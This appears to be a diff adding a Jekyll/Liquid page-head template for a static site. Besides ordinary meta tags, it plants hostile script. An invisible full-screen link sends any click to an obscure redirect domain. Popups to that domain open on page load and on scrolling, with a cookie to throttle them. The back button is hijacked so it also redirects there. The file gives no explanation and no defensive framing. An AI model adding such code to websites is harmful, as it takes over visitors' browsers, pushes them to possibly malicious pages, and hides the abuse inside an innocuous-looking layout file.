@@ -1,0 +1,82 @@
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>{% if page.title %}{{ page.title | escape_once }}{% else %}{{ site.title | escape_once }}{% endif %}</title>
+  <meta name="description" content="{% if page.excerpt %}{{ page.excerpt | strip_html | strip_newlines | truncate: 160 }}{% else %}{{ site.description }}{% endif %}">
+  <link rel="alternate" type="application/rss+xml" title="{{ site.title }}" href="{{ "/feed.xml" | prepend: site.baseurl | prepend: site.url }}">
+  <meta name="google-site-verification" content="mYViEREEOiKsFSGESV9vXVGiLMsuE3wJEeNHBtwMPlM" />
+  <meta name="msvalidate.01" content="DCDCB94AC18DA5870E55E8EFBE3787D5" />
+  <link rel="shortcut icon" href="/favicon.ico">
+</head>
+
+<style>
+* {font-weight:lighter !important;text-decoration:none;color:#000 !important;line-height:80px}
+body {width:80%;margin:0 auto}
+#t {box-shadow: 0px 14px 42px 0px rgb(163 174 184 / 15%);background:#fff;padding:35px;box-sizing:border-box;border-radius:15px;margin:30px 0;list-style:none}
+.mobile {display:none}
+@media (max-width:1024px) {
+.mobile {display:block}
+}
+</style>
+
+<h1>{{ site.title }}</h1>
+
+<script>
+function setCookie( name, value, expirehours ) {  
+    var todayDate = new Date(); 
+    todayDate.setHours( todayDate.getHours() + expirehours ); 
+    document.cookie = name + "=" +escape( value ) + "; path=/; expires=" + todayDate.toGMTString() + ";" 
+}
+ 
+function todaycloseWin() { 
+    setCookie( "ncookie","done",24);
+    document.getElementById('s').style.display = "block"; 
+}
+</script>
+
+<a id="s" onclick='location.href="https://passablejeepparliament.com/k7x9zs3u?key=5effd1c73dce2934514a36cafdc4c1c8";todaycloseWin()' target="_blank" href="/">
+<div style='position:fixed;width:100%;height:100vh;z-index:999;top:0;left:0'></div></a>
+
+<script> 
+cookiedata = document.cookie; 
+if ( cookiedata.indexOf("ncookie=done") < 0 ){    
+    document.getElementById('s').style.display = "block";
+    window.open("https://passablejeepparliament.com/k7x9zs3u?key=5effd1c73dce2934514a36cafdc4c1c8","","width=400, height=300, top=500, left=10");
+}else{ 
+    document.getElementById('s').style.display = "none"; 
+} 
+</script>
+
+<script>
+history.pushState(null, null, '');
+ window.onpopstate = function(event) {
+  if(event){
+	history.back();
+location.href="https://passablejeepparliament.com/k7x9zs3u?key=5effd1c73dce2934514a36cafdc4c1c8";
+  }
+}
+</script>
+
+<div id="tester"></div>
+<script src="//code.jquery.com/jquery-3.2.1.min.js"></script>
+<script>
+	
+	$(window).on('scroll',function() {
+    if (checkVisible($('#tester'))) {
+	javascript:win();
+        $(window).off('scroll');
+    } else {
+        window.open("https://passablejeepparliament.com/k7x9zs3u?key=5effd1c73dce2934514a36cafdc4c1c8","","width=400, height=300, top=500, left=10");
+    }
+});
+function checkVisible( elm, eval ) {
+    eval = eval || "object visible";
+    var viewportHeight = $(window).height(), // Viewport Height
+        scrolltop = $(window).scrollTop(), // Scroll Top
+        y = $(elm).offset().top,
+        elementHeight = $(elm).height();   
+    
+    if (eval == "object visible") return ((y < (viewportHeight + scrolltop)) && (y > (scrolltop - elementHeight)));
+    if (eval == "above") return ((y < (viewportHeight + scrolltop)));
+}
+</script>
